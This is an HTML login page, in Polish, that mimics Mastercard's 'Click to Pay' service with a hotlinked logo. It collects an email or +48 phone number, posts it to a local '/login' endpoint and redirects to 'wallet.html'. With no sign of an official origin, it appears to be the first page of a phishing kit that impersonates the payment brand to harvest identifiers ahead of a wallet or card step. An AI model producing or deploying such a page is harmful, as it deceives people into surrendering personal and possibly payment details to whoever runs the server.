<!DOCTYPE html>
<html lang="pl">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Click to Pay</title>
  <script src="https://cdn.tailwindcss.com"></script>
  <style>
    input:focus ~ label,
    input:not(:placeholder-shown) ~ label {
      transform: scale(0.85) translateY(-1.5rem);
      color: #e14d2a;
    }
    input:focus {
      border-color: #e14d2a;
    }
    .error input {
      border-color: #dc2626;
    }
    .error-icon {
      position: absolute;
      right: 1rem;
      top: 50%;
      transform: translateY(-50%);
      background: #dc2626;
      color: white;
      border-radius: 9999px;
      width: 1.25rem;
      height: 1.25rem;
      display: flex;
      align-items: center;
      justify-content: center;
      font-size: 0.75rem;
    }
  </style>
</head>
<body class="bg-[#1a1a1a] text-white font-sans">
  <div class="max-w-md mx-auto mt-6 p-4">
    <!-- Header -->
    <div class="flex justify-between items-center mb-6">
      <img src="https://img.icons8.com/color/48/000000/mastercard-logo.png" class="w-10 h-10" />
      <div class="relative group">
        <button id="langBtn" class="flex items-center space-x-2">
          <img src="https://img.icons8.com/ios-filled/24/999999/globe.png" class="w-5 h-5" />
          <span class="text-white text-sm">PL</span>
        </button>
        <div id="langMenu" class="hidden absolute right-0 mt-2 bg-white text-black text-sm rounded shadow w-40 z-10">
          <button class="block w-full text-left px-4 py-2 hover:bg-gray-100">Polska</button>
        </div>
      </div>
    </div>

    <!-- Title -->
    <div class="mb-4">
      <h1 class="text-[#e14d2a] text-lg font-semibold leading-tight">Click to Pay</h1>
      <p class="text-white text-lg">Szybki, bezpieczny sposób płatności online</p>
    </div>

    <!-- Subtitle -->
    <p class="text-sm mb-6">Utwórz profil lub zaloguj się</p>

    <!-- Form -->
    <form id="loginForm" novalidate>
      <div class="relative mb-1">
        <input
          id="userInput"
          name="userInput"
          type="text"
          placeholder=" "
          class="peer w-full bg-transparent border border-white rounded px-4 py-3 focus:outline-none"
          required
          pattern="(^\+48\d{9}$)|(^[\w.-]+@[\w.-]+\.\w{2,}$)"
        />
        <label for="userInput" class="absolute left-4 top-3 text-gray-400 text-sm transition-all peer-placeholder-shown:top-3.5 peer-placeholder-shown:text-base peer-placeholder-shown:text-gray-500 pointer-events-none">Adres e-mail lub numer telefonu komórkowego</label>
        <div class="hidden error-icon">!</div>
      </div>
      <p id="helperText" class="text-xs text-white opacity-70 mb-4">Click to Pay użyje tych informacji, aby Cię zweryfikować i wysyłać na ten numer kody weryfikacyjne. Mogą zostać naliczone opłaty za wiadomości/transmisję danych.</p>

      <button
        type="submit"
        class="w-full bg-gray-600 hover:bg-[#e14d2a] text-white font-semibold py-3 rounded transition-colors"
      >
        KONTYNUUJ
      </button>
    </form>

    <!-- Footer -->
    <div class="mt-12 text-xs text-center space-x-2 text-white">
      <span>WARUNKI</span>
      <span>&middot;</span>
      <span>PRYWATNOŚĆ</span>
      <span>&middot;</span>
      <span>PLIKI COOKIE</span>
      <span>&middot;</span>
      <span>OPINIA</span>
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const input = document.getElementById('userInput');
    const helperText = document.getElementById('helperText');
    const langBtn = document.getElementById('langBtn');
    const langMenu = document.getElementById('langMenu');

    langBtn.addEventListener('click', (e) => {
      e.preventDefault();
      langMenu.classList.toggle('hidden');
    });

    form.addEventListener('submit', async (e) => {
      e.preventDefault();
      const value = input.value.trim();
      const emailRegex = /^[\w.-]+@[\w.-]+\.\w{2,}$/;
      const phoneRegex = /^\+48\d{9}$/;

      if (!value) {
        showError('To pole jest wymagane');
        return;
      }

      if (!emailRegex.test(value) && !phoneRegex.test(value)) {
        showError('Potwierdź adres e-mail i spróbuj ponownie');
        return;
      }

      clearError();

      try {
        const res = await fetch('/login', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ user: value })
        });

        if (res.ok) {
          window.location.href = 'wallet.html';
        } else {
          showError('Błąd logowania');
        }
      } catch (err) {
        showError('Błąd połączenia');
      }
    });

    function showError(msg) {
      input.parentElement.classList.add('error');
      input.nextElementSibling.classList.remove('text-gray-400');
      input.nextElementSibling.classList.add('text-red-500');
      input.parentElement.querySelector('.error-icon').classList.remove('hidden');
      helperText.textContent = msg;
      helperText.classList.add('text-red-500');
    }

    function clearError() {
      input.parentElement.classList.remove('error');
      input.nextElementSibling.classList.remove('text-red-500');
      input.nextElementSibling.classList.add('text-gray-400');
      input.parentElement.querySelector('.error-icon').classList.add('hidden');
      helperText.textContent = 'Click to Pay użyje tych informacji, aby Cię zweryfikować i wysyłać na ten numer kody weryfikacyjne. Mogą zostać naliczone opłaty za wiadomości/transmisję danych.';
      helperText.classList.remove('text-red-500');
    }
  </script>
</body>
</html>
